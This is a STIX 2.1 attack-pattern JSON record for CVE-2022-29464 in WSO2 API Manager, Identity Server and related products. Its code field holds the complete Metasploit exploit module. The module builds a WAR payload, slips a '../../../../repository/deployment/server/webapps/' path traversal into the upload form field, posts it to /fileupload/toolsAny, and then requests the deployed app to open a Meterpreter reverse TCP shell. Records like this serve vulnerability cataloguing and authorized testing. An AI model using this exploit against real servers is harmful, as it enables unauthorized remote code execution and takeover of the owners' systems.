{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4078aa7-6581-4114-abeb-a6475693f4e8",
    "created": "2024-08-14T17:07:42.730863Z",
    "modified": "2024-08-14T17:07:42.730867Z",
    "name": "WSO2 Arbitrary File Upload to RCE",
    "description": " This module abuses a vulnerability in certain WSO2 products that allow unrestricted file upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wso2_file_upload_rce.rb",
            "external_id": "wso2_file_upload_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-29464"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/hakivvi/CVE-2022-29464"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/wvuuuuuuuuuuuuu/status/1517433974003576833"
        },
        {
            "source_name": "reference",
            "url": "https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Retry\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WSO2 Arbitrary File Upload to RCE',\n        'Description' => %q{\n          This module abuses a vulnerability in certain WSO2 products that allow unrestricted file\n          upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and\n          above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server\n          Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above\n          through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.\n        },\n        'Author' => [\n          'Orange Tsai', # Discovery\n          'hakivvi', # analysis and PoC\n          'wvu', # PoC\n          'Jack Heysel <jack_heysel[at]rapid7.com>' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2022-29464'],\n          [ 'URL', 'https://github.com/hakivvi/CVE-2022-29464' ],\n          [ 'URL', 'https://twitter.com/wvuuuuuuuuuuuuu/status/1517433974003576833' ],\n          [ 'URL', 'https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738' ]\n        ],\n        'DefaultOptions' => {\n          'Payload' => 'java/meterpreter/reverse_tcp',\n          'SSL' => true,\n          'RPORT' => 9443\n        },\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Java Dropper',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n              'Type' => :java_dropper,\n              'DefaultOptions' => {\n                'WfsDelay' => 10\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2022-04-01',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options(\n      [\n        OptInt.new('WAR_DEPLOY_DELAY', [true, 'How long to wait for the war file to deploy, in seconds', 20 ]),\n        OptString.new('TARGETURI', [ true, 'Relative URI of WSO2 product installation', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'fileupload', 'toolsAny'),\n      'method' => 'POST'\n    )\n\n    if res && res.code == 200 && res.headers['Server'] && res.headers['Server'] =~ /WSO2/\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Unknown\n    end\n  end\n\n  def prepare_payload(app_name)\n    print_status('Preparing payload...')\n\n    war_payload = payload.encoded_war.to_s\n    fname = app_name + '.war'\n    path_traveral = '../../../../repository/deployment/server/webapps/' + fname\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(war_payload,\n                       'application/octet-stream', 'binary',\n                       \"form-data; name=\\\"#{path_traveral}\\\"; filename=\\\"#{fname}\\\"\")\n    post_data\n  end\n\n  def upload_payload(post_data)\n    print_status('Uploading payload...')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'fileupload', 'toolsAny'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s\n    )\n    if res && res.code == 200\n      print_good('Payload uploaded successfully')\n    else\n      fail_with(Failure::UnexpectedReply, 'Payload upload attempt failed')\n    end\n  end\n\n  def execute_payload(app_name)\n    res = nil\n    print_status('Executing payload... ')\n    retry_until_truthy(timeout: datastore['WAR_DEPLOY_DELAY']) do\n      print_status('Waiting for shell... ')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, app_name),\n        'method' => 'GET'\n      )\n      if res && res.code == 200\n        break\n      else\n        next\n      end\n    end\n\n    if res && res.code == 200\n      print_good('Payload executed successfully')\n    else\n      fail_with(Failure::UnexpectedReply, 'Payload execution attempt failed')\n    end\n  end\n\n  def exploit\n    app_name = Rex::Text.rand_text_alpha(4..7)\n    data = prepare_payload(app_name)\n    upload_payload(data)\n    execute_payload(app_name)\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-04-01",
    "x_mitre_platforms": [
        "java'"
    ]
}